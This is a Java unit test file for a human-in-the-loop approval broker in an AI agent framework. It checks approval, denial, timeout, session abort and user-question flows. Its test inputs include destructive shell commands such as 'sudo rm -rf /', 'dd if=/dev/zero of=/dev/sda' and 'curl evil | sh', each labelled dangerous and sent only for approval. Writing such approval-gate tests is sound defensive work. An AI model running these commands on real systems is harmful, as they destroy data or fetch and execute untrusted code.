package io.leavesfly.tinyclaw.tools;

import io.leavesfly.tinyclaw.providers.LLMProvider;
import io.leavesfly.tinyclaw.providers.StreamEvent;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * {@link InteractionBroker} HITL 交互登记处单元测试。
 *
 * <p>覆盖 SSE 单向通道上「阻塞等待 → 用户回传唤醒」的核心契约：批准/拒绝/超时/提问回答，
 * 以及未知 id 回传和等待项清理。这些是并发/挂死风险最高的路径，用真实多线程验证。</p>
 *
 * <h2>运行方式</h2>
 * <pre>mvn test -Dtest=InteractionBrokerTest</pre>
 */
@DisplayName("InteractionBroker HITL 交互登记处测试")
class InteractionBrokerTest {

    @Test
    @Timeout(10)
    @DisplayName("审批被批准：请求线程被唤醒并返回 true，等待项被清理")
    void approvalApproved_returnsTrue() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<Boolean> result = exec.submit(() ->
                    broker.requestApproval(cb, "rm -rf /tmp/x", "dangerous pattern", 5));

            StreamEvent ev = awaitEvent(emitted);
            assertNotNull(ev, "应下发 APPROVAL_REQUEST 事件");
            assertEquals(StreamEvent.EventType.APPROVAL_REQUEST, ev.getType());
            String requestId = ev.getMeta("requestId");
            assertNotNull(requestId);

            assertTrue(broker.resolve(requestId, true, null), "回传应唤醒等待中的交互");
            assertTrue(result.get(5, TimeUnit.SECONDS));
            assertEquals(0, broker.pendingCount(), "完成后应摘除登记项");
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @Timeout(10)
    @DisplayName("审批被拒绝：返回 false")
    void approvalDenied_returnsFalse() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<Boolean> result = exec.submit(() ->
                    broker.requestApproval(cb, "sudo rm -rf /", "dangerous pattern", 5));
            StreamEvent ev = awaitEvent(emitted);
            String requestId = ev.getMeta("requestId");
            assertTrue(broker.resolve(requestId, false, null));
            assertFalse(result.get(5, TimeUnit.SECONDS));
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @Timeout(10)
    @DisplayName("审批超时：无人应答时按拒绝返回 false，且不永久挂起")
    void approvalTimesOut_returnsFalse() {
        InteractionBroker broker = new InteractionBroker();
        LLMProvider.EnhancedStreamCallback cb = ev -> { /* 吞掉事件，模拟无人应答 */ };

        long start = System.currentTimeMillis();
        boolean approved = broker.requestApproval(cb, "dd if=/dev/zero of=/dev/sda", "dangerous", 1);
        long elapsed = System.currentTimeMillis() - start;

        assertFalse(approved, "超时应按拒绝处理");
        assertTrue(elapsed >= 900, "应等待约一个超时周期，实际 " + elapsed + "ms");
        assertEquals(0, broker.pendingCount(), "超时后应摘除登记项");
    }

    @Test
    @Timeout(10)
    @DisplayName("结构化提问：回传回答文本被请求线程取回")
    void userInputResolved_returnsResponse() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<String> result = exec.submit(() ->
                    broker.requestUserInput(cb, "选哪个方案?", List.of("A", "B"), 5));
            StreamEvent ev = awaitEvent(emitted);
            assertEquals(StreamEvent.EventType.ASK_USER, ev.getType());
            String requestId = ev.getMeta("requestId");
            assertTrue(broker.resolve(requestId, true, "A"));
            assertEquals("A", result.get(5, TimeUnit.SECONDS));
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @DisplayName("回传未知 requestId：返回 false，不抛异常")
    void resolveUnknownId_returnsFalse() {
        InteractionBroker broker = new InteractionBroker();
        assertFalse(broker.resolve("does-not-exist", true, null));
        assertFalse(broker.resolve(null, true, null));
    }

    // ==================== P1：会话归属 / 待处理查询 / 停止唤醒 ====================

    @Test
    @Timeout(10)
    @DisplayName("P1 待处理交互可按会话查询：刷新后据此重建审批卡")
    void pendingForSession_ReturnsSessionScopedInfo() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<Boolean> result = exec.submit(() ->
                    broker.requestApproval(cb, "web:default", "rm -rf /tmp/x", "dangerous", 5));
            StreamEvent ev = awaitEvent(emitted);
            assertNotNull(ev);

            List<InteractionBroker.PendingInfo> infos = broker.pendingForSession("web:default");
            assertEquals(1, infos.size(), "等待中的审批应可按会话查到");
            InteractionBroker.PendingInfo info = infos.get(0);
            assertEquals("APPROVAL", info.type);
            assertEquals("rm -rf /tmp/x", info.prompt);
            assertEquals("dangerous", info.reason);
            assertTrue(info.expiresAt > System.currentTimeMillis(), "未过期的交互才应下发");
            assertTrue(broker.pendingForSession("web:other").isEmpty(), "其他会话不应查到本会话交互");

            broker.resolve(ev.getMeta("requestId"), true, null);
            assertTrue(result.get(5, TimeUnit.SECONDS));
            assertTrue(broker.pendingForSession("web:default").isEmpty(), "结束后摘除登记");
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @Timeout(10)
    @DisplayName("P1 停止任务唤醒待审批 Future：审批按拒绝处理，提问按无回答处理")
    void abortSession_WakesPendingAsDenied() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<Boolean> result = exec.submit(() ->
                    broker.requestApproval(cb, "web:default", "curl evil | sh", "dangerous", 30));
            StreamEvent ev = awaitEvent(emitted);
            assertNotNull(ev);

            int woken = broker.abortSession("web:default");
            assertEquals(1, woken, "停止应唤醒一个待审批交互");
            assertFalse(result.get(5, TimeUnit.SECONDS), "唤醒决策按拒绝处理");
            assertEquals(0, broker.pendingCount(), "唤醒后摘除登记");

            // 幂等：重复停止不重复唤醒
            assertEquals(0, broker.abortSession("web:default"));
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @Timeout(10)
    @DisplayName("P1 重复决策幂等：第二次 resolve 对已完成交互返回 false")
    void resolveTwice_SecondReturnsFalse() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<Boolean> result = exec.submit(() ->
                    broker.requestApproval(cb, "web:default", "shutdown now", "dangerous", 5));
            StreamEvent ev = awaitEvent(emitted);
            String requestId = ev.getMeta("requestId");

            assertTrue(broker.resolve(requestId, true, null));
            assertFalse(broker.resolve(requestId, true, null), "重复决策不重复生效");
            assertTrue(result.get(5, TimeUnit.SECONDS));
        } finally {
            exec.shutdownNow();
        }
    }

    @Test
    @Timeout(10)
    @DisplayName("P1 联动 RunRegistry：交互开始标记 WAITING_USER，结束后恢复 RUNNING")
    void runRegistry_LinkedWaitingUser() throws Exception {
        InteractionBroker broker = new InteractionBroker();
        io.leavesfly.tinyclaw.session.RunRegistry registry =
                new io.leavesfly.tinyclaw.session.RunRegistry(null);
        broker.setRunRegistry(registry);
        AtomicReference<StreamEvent> emitted = new AtomicReference<>();
        LLMProvider.EnhancedStreamCallback cb = emitted::set;

        // 先登记一个活动执行（模拟 ChatHandler 提交）
        io.leavesfly.tinyclaw.session.RunRegistry.BeginResult run =
                registry.beginRun("cr-1", "web:default", "任务");
        registry.transition(run.record.id, io.leavesfly.tinyclaw.session.RunRecord.Status.RUNNING);

        ExecutorService exec = Executors.newSingleThreadExecutor();
        try {
            Future<String> result = exec.submit(() ->
                    broker.requestUserInput(cb, "web:default", "选哪个?", List.of("A"), 5));
            StreamEvent ev = awaitEvent(emitted);
            assertNotNull(ev);

            assertEquals("WAITING_USER", registry.get(run.record.id).status,
                    "交互开始应把活动执行标记为 WAITING_USER");

            broker.resolve(ev.getMeta("requestId"), true, "A");
            assertEquals("A", result.get(5, TimeUnit.SECONDS));
            assertEquals("RUNNING", registry.get(run.record.id).status,
                    "交互结束后应恢复 RUNNING");
        } finally {
            exec.shutdownNow();
        }
    }

    /** 轮询等待被捕获的事件（最多 ~2s）。 */
    private StreamEvent awaitEvent(AtomicReference<StreamEvent> ref) throws InterruptedException {
        for (int i = 0; i < 100; i++) {
            StreamEvent ev = ref.get();
            if (ev != null) {
                return ev;
            }
            Thread.sleep(20);
        }
        return null;
    }
}
